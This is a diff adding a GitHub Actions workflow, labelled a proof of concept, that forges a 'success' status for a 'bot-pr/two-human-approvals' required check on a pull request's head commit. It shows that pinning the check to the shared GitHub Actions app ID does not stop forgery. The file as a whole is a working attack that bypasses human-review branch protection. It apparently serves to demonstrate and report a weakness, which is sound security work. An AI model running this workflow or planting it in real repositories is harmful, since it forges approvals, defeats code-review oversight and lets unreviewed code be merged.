@@ -1,0 +1,42 @@
+# POC — demonstrates that pinning the required check to integration_id 15368
+# (the shared "GitHub Actions" app) is NOT sufficient: ANY workflow in the repo
+# with statuses:write posts as app 15368 and can satisfy the pinned check.
+#
+# Runs as GitHub Actions and forges a `success` status for the
+# `bot-pr/two-human-approvals` context on a target PR's head commit. Needs write
+# access to THIS repo — the branch push runs in the trusted context with a
+# writable GITHUB_TOKEN (a fork PR would get a read-only token and could not do
+# this). Resolves the head SHA from the PR itself, so nothing is hardcoded.
+name: poc-forge-status
+
+on:
+  push:                     # runs as soon as the branch is pushed (trusted context)
+  workflow_dispatch:        # re-run manually if the target PR head moves
+    inputs:
+      pr:
+        description: "PR number to forge the status on"
+        default: "18"
+        required: true
+
+permissions:
+  statuses: write           # the whole point: a second workflow granting itself this
+  pull-requests: read       # to look up the target PR's head SHA
+
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Forge the required status on the target PR head
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          PR: ${{ github.event.inputs.pr || '18' }}
+        run: |
+          set -euo pipefail
+          SHA="$(gh api "/repos/${GITHUB_REPOSITORY}/pulls/${PR}" --jq '.head.sha')"
+          echo "Target PR #${PR} head SHA: ${SHA}"
+          gh api --method POST \
+            "/repos/${GITHUB_REPOSITORY}/statuses/${SHA}" \
+            -f state=success \
+            -f context=bot-pr/two-human-approvals \
+            -f description="forged by poc-forge-status (posted as app 15368)"
+          echo "Posted bot-pr/two-human-approvals=success on ${SHA} as GitHub Actions"
